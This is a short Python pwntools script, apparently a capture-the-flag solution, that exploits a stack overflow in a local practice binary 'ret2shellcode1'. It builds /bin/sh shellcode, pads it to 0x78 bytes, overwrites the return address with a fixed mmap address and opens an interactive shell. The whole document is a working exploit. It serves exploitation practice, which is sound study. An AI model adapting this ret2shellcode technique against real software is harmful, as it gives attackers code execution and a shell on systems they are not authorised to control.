#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2shellcode1')
elf = ELF('./ret2shellcode1')

mmap_addr = 0x123000
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x78, b'A') + p64(mmap_addr)

p.recvuntil("Please pwn me :)\n")
p.sendline(payload)
p.interactive()
